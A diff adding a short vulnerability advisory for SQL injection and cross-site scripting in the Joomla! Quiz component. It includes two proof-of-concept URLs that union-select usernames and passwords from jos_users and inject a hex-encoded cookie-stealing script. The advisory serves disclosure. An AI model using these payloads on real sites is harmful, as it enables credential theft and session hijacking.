@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/56338/info
+
+The Quiz component for Joomla! is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/index.php?option=com_quiz&task=user_tst_shw&Itemid={RANDOM}&tid={RANDOM}/**/and/**/1=0/**/union/**/select/**/1,0x3c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e,concat(username,0x3D,password)/**/from/**/jos_users+--+
+
+http://www.example.com/index.php?option=com_quiz&task=user_tst_shw&Itemid={RANDOM}&tid={RANDOM}/**/and/**/1=0/**/union/**/select/**/1,0x3c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e,0x3c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e+--+ 
